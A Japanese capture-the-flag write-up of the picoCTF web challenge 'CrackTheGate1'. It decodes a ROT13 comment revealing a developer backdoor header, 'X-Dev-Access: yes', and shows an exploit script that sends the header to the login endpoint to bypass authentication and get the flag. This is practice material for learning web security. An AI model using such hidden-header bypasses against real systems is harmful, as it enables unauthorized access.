---
title: 'CrackTheGate1 - picoCTF'
description: 'Crack The Gate1のWriteupです。'
pubDate: 2025-12-20
category: 'CTF'
tags: ['picoCTF', 'Writeup', 'Web', 'CaesarCipher']
---

# CrackTheGate1 - picoCTF

## Initial Observation
ログイン画面があり、ログインするとflagが取れそう!\
ソースコードのコメントアウトが独特、気になる

### View source code
```html
<!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" -->
<!-- Remove before pushing to production! -->  
```

## Decode
読めそうで読めない文字はシーザー暗号(**rot**)と推測

```python
import string

e = input()
for i in range(1, 26):
  table = str.maketrans(
    string.ascii_lowercase + string.ascii_uppercase,
    string.ascii_lowercase[i:] + string.ascii_lowercase[:i] +
    string.ascii_uppercase[i:] + string.ascii_uppercase[:i]
  )
  print(f"rot{i}: {e.translate(table)}")
```

```bash
$ python3 rot.py
<!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" -->
rot1: <!-- BCHS: Xoqy - hsadcfofm pmdogg: igs vsorsf "L-Rsj-Oqqsgg: msg" -->
rot2: <!-- CDIT: Yprz - itbedgpgn qnephh: jht wtpstg "M-Stk-Prrthh: nth" -->
rot3: <!-- DEJU: Zqsa - jucfehqho rofqii: kiu xuqtuh "N-Tul-Qssuii: oui" -->
rot4: <!-- EFKV: Artb - kvdgfirip spgrjj: ljv yvruvi "O-Uvm-Rttvjj: pvj" -->
rot5: <!-- FGLW: Bsuc - lwehgjsjq tqhskk: mkw zwsvwj "P-Vwn-Suuwkk: qwk" -->
rot6: <!-- GHMX: Ctvd - mxfihktkr uritll: nlx axtwxk "Q-Wxo-Tvvxll: rxl" -->
rot7: <!-- HINY: Duwe - nygjiluls vsjumm: omy byuxyl "R-Xyp-Uwwymm: sym" -->
rot8: <!-- IJOZ: Evxf - ozhkjmvmt wtkvnn: pnz czvyzm "S-Yzq-Vxxznn: tzn" -->
rot9: <!-- JKPA: Fwyg - pailknwnu xulwoo: qoa dawzan "T-Zar-Wyyaoo: uao" -->
rot10: <!-- KLQB: Gxzh - qbjmloxov yvmxpp: rpb ebxabo "U-Abs-Xzzbpp: vbp" -->
rot11: <!-- LMRC: Hyai - rcknmpypw zwnyqq: sqc fcybcp "V-Bct-Yaacqq: wcq" -->
rot12: <!-- MNSD: Izbj - sdlonqzqx axozrr: trd gdzcdq "W-Cdu-Zbbdrr: xdr" -->
rot13: <!-- NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes" -->
rot14: <!-- OPUF: Kbdl - ufnqpsbsz czqbtt: vtf ifbefs "Y-Efw-Bddftt: zft" -->
rot15: <!-- PQVG: Lcem - vgorqtcta darcuu: wug jgcfgt "Z-Fgx-Ceeguu: agu" -->
rot16: <!-- QRWH: Mdfn - whpsrudub ebsdvv: xvh khdghu "A-Ghy-Dffhvv: bhv" -->
rot17: <!-- RSXI: Nego - xiqtsvevc fcteww: ywi liehiv "B-Hiz-Eggiww: ciw" -->
rot18: <!-- STYJ: Ofhp - yjrutwfwd gdufxx: zxj mjfijw "C-Ija-Fhhjxx: djx" -->
rot19: <!-- TUZK: Pgiq - zksvuxgxe hevgyy: ayk nkgjkx "D-Jkb-Giikyy: eky" -->
rot20: <!-- UVAL: Qhjr - altwvyhyf ifwhzz: bzl olhkly "E-Klc-Hjjlzz: flz" -->
rot21: <!-- VWBM: Riks - bmuxwzizg jgxiaa: cam pmilmz "F-Lmd-Ikkmaa: gma" -->
rot22: <!-- WXCN: Sjlt - cnvyxajah khyjbb: dbn qnjmna "G-Mne-Jllnbb: hnb" -->
rot23: <!-- XYDO: Tkmu - dowzybkbi lizkcc: eco roknob "H-Nof-Kmmocc: ioc" -->
rot24: <!-- YZEP: Ulnv - epxazclcj mjaldd: fdp splopc "I-Opg-Lnnpdd: jpd" -->
rot25: <!-- ZAFQ: Vmow - fqybadmdk nkbmee: geq tqmpqd "J-Pqh-Mooqee: kqe" -->
```

結果:
- rot13が`X-Dev-Access: yes`

## Acquisition of flag
この結果をHeaderに挿入して実行すればlogin可能と推測

```python
import requests
from urllib.parse import *

URL = "http://challenge-host/"
headers = {
  "X-Dev-Access" : "yes"
}
data = {
  "email":"ctf-player@picoctf.org",
  "password":"password"
}
endpoint = "/login"

req = requests.post(urljoin(URL, endpoint), headers=headers, json=data)

print(req.text)
```

> 認証は X-Dev-Access Headerの有無のみ\
> email/passwordは実質必要ない

```bash
$ python3 exploit.py 
{"success":true,"email":"ctf-player@picoctf.org","firstName":"pico","lastName":"player","flag":"picoCTF{}"}
```